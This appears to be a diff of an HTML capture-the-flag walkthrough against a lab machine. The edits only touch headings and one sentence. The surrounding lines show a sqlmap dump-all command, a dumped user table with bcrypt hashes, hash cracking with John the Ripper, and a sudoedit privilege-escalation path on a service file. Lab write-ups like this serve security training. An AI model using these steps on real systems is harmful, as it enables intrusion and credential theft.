@@ -512,7 +512,7 @@ Requests/sec.: 0
 <p>We can check for SQL Injection vulnerabilities using SQLmap: <code>sqlmap -u http://10.10.212.230/admin --forms --dump-all</code></p>
 <p>However,</p>
 <pre><code>[ERROR] all tested parameters do not appear to be injectable.
-</code></pre><h3 id="16-login-page-exploration-fail-can-be-skipped">1.6. Login Page Exploration (Fail) (can be skipped)</h3>
+</code></pre><h3 id="16-login-page-exploration-fail-can-be-skipped">1.6. Login Page Exploration (fail) (can be skipped)</h3>
 <pre><code>GET /login?action= HTTP/1.1
 Host: 10.10.212.230
 Upgrade-Insecure-Requests: 1
@@ -550,7 +550,7 @@ Table: system_user
 | 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
 +----+----------------------+--------------+--------------------------------------------------------------+
 </code></pre><p>In the <code>user</code> table we get the first flag :D</p>
-<h3 id="hash-cracking">Hash Cracking</h3>
+<h3 id="18-hash-cracking">1.8. Hash Cracking</h3>
 <pre><code>┌──(kali㉿kali)-[/tmp]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -638,7 +638,7 @@ Matching Defaults entries for server-admin on duckyinc:
 User server-admin may run the following commands on duckyinc:
     (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
         duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
-</code></pre><p>Great! Looks like we have a way to root!</p>
+</code></pre><p>Great! Looks like sudo can lead us to!</p>
 <h2 id="3-privesc">3. PrivEsc</h2>
 <h3 id="31-getting-root">3.1. Getting root</h3>
 <p>Type in: <code>sudoedit /etc/systemd/system/duckyinc.service</code> and replace the contents with the below.</p>
